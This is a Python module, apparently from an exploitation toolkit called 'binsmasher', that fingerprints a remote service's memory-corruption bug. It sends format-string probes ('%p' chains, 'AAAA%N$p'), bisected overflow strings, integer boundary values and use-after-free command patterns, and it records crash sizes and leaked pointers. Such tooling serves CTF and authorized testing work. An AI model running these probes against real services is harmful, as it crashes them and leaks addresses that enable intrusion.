"""
Automatic vulnerability type detection.

Probes the target with crafted inputs to determine the vuln class:
  STACK_OVERFLOW  — classic buffer overflow on stack
  FORMAT_STRING   — printf/sprintf with user-controlled format
  HEAP_OVERFLOW   — overflow in heap-allocated buffer
  UAF             — use-after-free (double-free / dangling ptr)
  INTEGER_OVF     — integer overflow affecting buffer size
  UNKNOWN         — could not determine
"""
from __future__ import annotations

import logging
import socket
import struct
import time

log = logging.getLogger("binsmasher")

# ── Result dataclass ──────────────────────────────────────────────────────────

class VulnInfo:
    def __init__(self):
        self.vuln_type: str = "UNKNOWN"
        self.confidence: float = 0.0          # 0.0–1.0
        self.format_string_offset: int | None = None
        self.crash_size: int | None = None
        self.leak_candidates: list[str] = []  # hex strings of leaked values
        self.notes: list[str] = []

    def __str__(self):
        return (f"VulnInfo(type={self.vuln_type} confidence={self.confidence:.0%} "
                f"crash_size={self.crash_size} fmtoff={self.format_string_offset})")


# ── Detector ──────────────────────────────────────────────────────────────────

class VulnDetector:
    """Probe a TCP/UDP service to fingerprint the vulnerability class."""

    # Format string probes — look for hex values in the response
    FMT_PROBES = [
        b"%p.%p.%p.%p.%p.%p.%p.%p",
        b"%1$p.%2$p.%3$p.%4$p",
        b"AAAA%p%p%p%p%p%p",
        b"%s%s%s%s",
        b"%.100x%.100x%.100x",
    ]

    # Heap size boundary values that often trigger integer overflows
    INT_OVF_SIZES = [
        0xFFFFFFFF,
        0x80000000,
        0x7FFFFFFF,
        0xFFFF,
        0x10000,
        0xFFFFFFFFFFFFFFFF,
    ]

    def __init__(self, host: str, port: int, udp: bool = False,
                 connect_timeout: float = 3.0, recv_timeout: float = 2.0):
        self.host = host
        self.port = port
        self.udp = udp
        self.connect_timeout = connect_timeout
        self.recv_timeout = recv_timeout

    # ── Low-level I/O ──────────────────────────────────────────────────────

    def _send_recv(self, payload: bytes, drain_lines: int = 1) -> bytes:
        """Send payload, receive response. Returns b'' on crash/timeout."""
        try:
            if self.udp:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(self.recv_timeout)
                sock.sendto(payload + b"\n", (self.host, self.port))
                try:
                    data, _ = sock.recvfrom(4096)
                    return data
                except socket.timeout:
                    return b""
                finally:
                    sock.close()
            else:
                conn = socket.create_connection(
                    (self.host, self.port), timeout=self.connect_timeout)
                conn.settimeout(self.recv_timeout)
                # Drain banner lines
                for _ in range(drain_lines):
                    try:
                        conn.recv(1024)
                    except socket.timeout:
                        break
                conn.sendall(payload + b"\n")
                data = b""
                try:
                    while True:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                except (socket.timeout, ConnectionResetError):
                    pass
                conn.close()
                return data
        except (ConnectionRefusedError, OSError):
            return b""
        except Exception as e:
            log.debug(f"[vuln_detect] _send_recv: {e}")
            return b""

    def _crashes(self, payload: bytes) -> bool:
        """Return True if sending this payload causes a crash (no/empty response)."""
        resp = self._send_recv(payload)
        return len(resp) == 0

    # ── Detection stages ───────────────────────────────────────────────────

    def _probe_baseline(self) -> tuple[bool, bytes]:
        """Check the service is alive and get a baseline response."""
        resp = self._send_recv(b"HELLO")
        alive = True  # even empty response is fine for UDP
        if not self.udp and resp == b"":
            # Try once more
            time.sleep(0.5)
            resp = self._send_recv(b"A")
            alive = resp != b"" or True  # crashes on empty input too
        return alive, resp

    def _detect_format_string(self) -> tuple[bool, int | None, list[str]]:
        """
        Probe for format string vulnerability.
        Returns (found, format_offset, leaked_values).
        """
        import re
        hex_pattern = re.compile(rb"0x[0-9a-fA-F]{4,16}")

        for probe in self.FMT_PROBES:
            resp = self._send_recv(probe)
            if not resp:
                continue
            # Look for hex-looking output (0x7f... = libc, 0x555... = PIE, etc.)
            matches = hex_pattern.findall(resp)
            if len(matches) >= 2:
                log.info(f"[vuln_detect] Format string: probe={probe[:20]!r} "
                         f"leaks={[m.decode() for m in matches[:5]]}")
                leaked = [m.decode() for m in matches]
                # Try to find the exact format string offset
                offset = self._find_fmt_offset()
                return True, offset, leaked

        # Check for memory content patterns even without 0x prefix
        for probe in self.FMT_PROBES[:2]:
            resp = self._send_recv(probe)
            if len(resp) > len(probe) + 4:
                # Response is longer than input — likely format expansion
                # or the response contains binary data (pointer bytes)
                non_printable = sum(1 for b in resp if b < 0x20 or b > 0x7e)
                if non_printable > 4:
                    log.info(f"[vuln_detect] Possible fmt/memory leak: "
                             f"{non_printable} non-printable bytes in response")
                    return True, None, []

        return False, None, []

    def _find_fmt_offset(self) -> int | None:
        """Binary search for the format string argument index."""
        # AAAA at a known position, find which %p leaks 0x41414141
        for idx in range(1, 50):
            probe = f"AAAA%{idx}$p".encode()
            resp = self._send_recv(probe)
            if b"0x41414141" in resp or b"41414141" in resp.lower():
                log.info(f"[vuln_detect] Format string offset: {idx}")
                return idx
        return None

    def _detect_stack_overflow(self) -> tuple[bool, int | None]:
        """
        Bisect to find the minimum input size that crashes the service.
        Returns (found, crash_size).
        """
        from pwn import cyclic, cyclic_find
        # Phase 1: find approximate crash size
        sizes = [64, 128, 256, 512, 1024, 2048, 4096]
        crash_sz = None
        safe_sz = 0

        for sz in sizes:
            if self._crashes(b"A" * sz):
                crash_sz = sz
                break
            safe_sz = sz

        if crash_sz is None:
            return False, None

        # Phase 2: bisect for exact boundary
        lo, hi = safe_sz, crash_sz
        for _ in range(12):
            if hi - lo <= 8:
                break
            mid = (lo + hi) // 2
            if self._crashes(b"A" * mid):
                hi = mid
            else:
                lo = mid

        exact = hi
        log.info(f"[vuln_detect] Stack overflow: crash at ~{exact} bytes")
        return True, exact

    def _detect_heap_overflow(self) -> tuple[bool, str]:
        """
        Heuristic heap overflow detection.
        Sends size + payload patterns that differ from stack overflows.
        """
        # Pattern: send a large chunk that would overflow a fixed heap buffer
        # Heap corruptions often crash at different addresses than stack ones

        # Try common heap service patterns: alloc(size) then write(data)
        for heap_size in [32, 64, 128, 256]:
            overflow_data = b"A" * (heap_size * 4)
            resp = self._send_recv(overflow_data)
            if resp == b"":
                # Check if small input still works
                small_resp = self._send_recv(b"A" * (heap_size // 2))
                if small_resp != b"":
                    log.info(f"[vuln_detect] Possible heap overflow at heap_size={heap_size}")
                    return True, f"overflow at ~{heap_size} bytes in heap"

        return False, ""

    def _detect_uaf(self) -> bool:
        """
        UAF heuristic: send patterns that trigger double-free or dangling ptr.
        Very heuristic — depends on protocol structure.
        """
        # Pattern: allocate, free marker, use again
        # Common in CTF services with explicit "alloc/free/use" commands
        uaf_patterns = [
            b"1\n2\n1\n",   # alloc + free + alloc (classic UAF)
            b"A\x00B",      # null byte in middle
            b"free\nuse\n",
        ]
        for pat in uaf_patterns:
            resp = self._send_recv(pat)
            # If service crashes on patterns that look like double-use, flag it
            if resp == b"" and not self._crashes(b"hello"):
                log.info("[vuln_detect] Possible UAF pattern detected")
                return True
        return False

    def _detect_integer_overflow(self) -> tuple[bool, str]:
        """
        Try sending boundary integer values as sizes.
        """
        for val in self.INT_OVF_SIZES:
            # Pack as both little-endian 32 and 64 bit
            for fmt in ("<I", "<Q"):
                try:
                    packed = struct.pack(fmt, val & ((1 << (32 if fmt=="<I" else 64)) - 1))
                    if self._crashes(packed + b"A" * 64):
                        if not self._crashes(b"\x08\x00\x00\x00" + b"A" * 64):
                            log.info(f"[vuln_detect] Integer overflow: val={hex(val)} fmt={fmt}")
                            return True, f"integer overflow with size={hex(val)}"
                except Exception:
                    pass
        return False, ""

    # ── Main detection flow ────────────────────────────────────────────────

    def detect(self) -> VulnInfo:
        """
        Run all detection probes and return a VulnInfo with the most likely type.
        """
        info = VulnInfo()
        log.info(f"[vuln_detect] Probing {self.host}:{self.port} "
                 f"({'UDP' if self.udp else 'TCP'})…")

        # 0. Baseline
        alive, baseline = self._probe_baseline()
        if not alive:
            info.notes.append("Service appears down or not responding")
            return info

        # 1. Format string (highest priority — check first as it's non-destructive)
        fmtstr, fmt_off, leaks = self._detect_format_string()
        if fmtstr:
            info.vuln_type = "FORMAT_STRING"
            info.confidence = 0.90
            info.format_string_offset = fmt_off
            info.leak_candidates = leaks
            info.notes.append(f"Format string confirmed at offset {fmt_off}")
            if leaks:
                info.notes.append(f"Leaked values: {leaks[:5]}")
            log.info(f"[vuln_detect] ✓ FORMAT_STRING (offset={fmt_off} leaks={leaks[:3]})")

        # 2. Integer overflow
        int_ovf, int_note = self._detect_integer_overflow()
        if int_ovf and info.vuln_type == "UNKNOWN":
            info.vuln_type = "INTEGER_OVERFLOW"
            info.confidence = 0.70
            info.notes.append(int_note)
            log.info(f"[vuln_detect] ✓ INTEGER_OVERFLOW")

        # 3. Stack overflow (most common)
        stack_ovf, crash_sz = self._detect_stack_overflow()
        if stack_ovf:
            info.crash_size = crash_sz
            if info.vuln_type == "UNKNOWN":
                info.vuln_type = "STACK_OVERFLOW"
                info.confidence = 0.85
                info.notes.append(f"Stack overflow crash at {crash_sz} bytes")
                log.info(f"[vuln_detect] ✓ STACK_OVERFLOW (crash_size={crash_sz})")
            elif info.vuln_type == "FORMAT_STRING":
                info.notes.append(f"Also has stack overflow at {crash_sz} bytes")
                info.confidence = 0.95
                info.notes.append("Dual vuln: format string + stack overflow")

        # 4. Heap overflow (only if stack overflow not found at small sizes)
        if info.vuln_type == "UNKNOWN" or (stack_ovf and crash_sz and crash_sz > 512):
            heap_ovf, heap_note = self._detect_heap_overflow()
            if heap_ovf and info.vuln_type == "UNKNOWN":
                info.vuln_type = "HEAP_OVERFLOW"
                info.confidence = 0.65
                info.notes.append(heap_note)
                log.info(f"[vuln_detect] ✓ HEAP_OVERFLOW")

        # 5. UAF (last resort)
        if info.vuln_type == "UNKNOWN":
            uaf = self._detect_uaf()
            if uaf:
                info.vuln_type = "UAF"
                info.confidence = 0.55
                info.notes.append("Possible use-after-free pattern")
                log.info(f"[vuln_detect] ✓ UAF (tentative)")

        if info.vuln_type == "UNKNOWN":
            info.notes.append("Could not determine vuln type — defaulting to STACK_OVERFLOW")
            info.vuln_type = "STACK_OVERFLOW"
            info.confidence = 0.30
            log.warning("[vuln_detect] Unknown vuln type — defaulting to STACK_OVERFLOW")

        return info
